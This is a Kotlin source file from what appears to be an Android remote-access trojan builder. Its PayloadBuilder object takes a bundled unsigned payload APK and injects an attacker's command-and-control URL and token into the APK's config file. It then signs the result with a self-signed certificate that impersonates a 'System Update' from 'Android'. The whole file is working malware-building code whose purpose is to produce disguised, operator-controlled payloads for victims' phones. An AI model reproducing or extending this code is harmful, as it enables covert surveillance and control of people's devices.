package com.ihk909.admin

import android.content.Context
import com.android.apksig.ApkSigner
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.security.KeyPairGenerator
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.Collections
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipInputStream
import java.util.zip.ZipOutputStream
import javax.security.auth.x500.X500Principal

object PayloadBuilder {
    @JvmStatic
    fun build(
        ctx: Context,
        c2Url: String,
        token: String,
        appName: String,
        pkgId: String,
        outPath: String
    ) {
        // 1) copy unsigned apk from assets to cache
        val tmp = File(ctx.cacheDir, "unsigned.apk")
        ctx.assets.open("payload-unsigned.apk").use { input ->
            FileOutputStream(tmp).use { out -> input.copyTo(out) }
        }

        // 2) rewrite cfg.json with real c2_url and token
        val cfgJson = """{"c2_url":"${c2Url.replace("\"","\\\"")}","token":"$token"}"""
        val cfgBytes = cfgJson.toByteArray(Charsets.UTF_8)

        val rewritten = File(ctx.cacheDir, "rewritten.apk")
        ZipInputStream(FileInputStream(tmp)).use { zin ->
            ZipOutputStream(FileOutputStream(rewritten)).use { zout ->
                while (true) {
                    val e = zin.nextEntry ?: break
                    val name = e.name

                    if (name == "assets/cfg.json") {
                        zout.putNextEntry(ZipEntry(name))
                        zout.write(cfgBytes)
                        zout.closeEntry()
                        continue
                    }

                    if (name.endsWith(".so") || name.endsWith(".apk")) {
                        val all = zin.readBytes()
                        val ne = ZipEntry(name).apply {
                            method = ZipEntry.STORED
                            size = all.size.toLong()
                            compressedSize = all.size.toLong()
                            crc = CRC32().apply { update(all) }.value
                        }
                        zout.putNextEntry(ne)
                        zout.write(all)
                        zout.closeEntry()
                    } else {
                        zout.putNextEntry(ZipEntry(name))
                        val buf = ByteArray(8192)
                        while (true) {
                            val n = zin.read(buf)
                            if (n <= 0) break
                            zout.write(buf, 0, n)
                        }
                        zout.closeEntry()
                    }
                }
            }
        }

        // 3) sign with self-signed cert derived from token
        sign(rewritten, File(outPath), token)

        tmp.delete()
        rewritten.delete()
    }

    private fun sign(input: File, output: File, seed: String) {
        val md = MessageDigest.getInstance("SHA-256")
        md.update(seed.toByteArray(Charsets.UTF_8))
        val entropy = md.digest()

        val kpg = KeyPairGenerator.getInstance("RSA").apply {
            initialize(2048, SecureRandom(entropy))
        }
        val kp = kpg.generateKeyPair()

        val subject = X500Principal("CN=System Update, OU=Android, O=System, C=US")
        val now = System.currentTimeMillis()
        val cert = SelfSignedCert.generate(
            kp, subject,
            java.util.Date(now - 86_400_000L),
            java.util.Date(now + 3650L * 86_400_000L)
        )

        val sc = ApkSigner.SignerConfig.Builder(
            "ihk909", kp.private, Collections.singletonList(cert)
        ).build()

        ApkSigner.Builder(Collections.singletonList(sc))
            .setInputApk(input)
            .setOutputApk(output)
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .build()
            .sign()
    }
}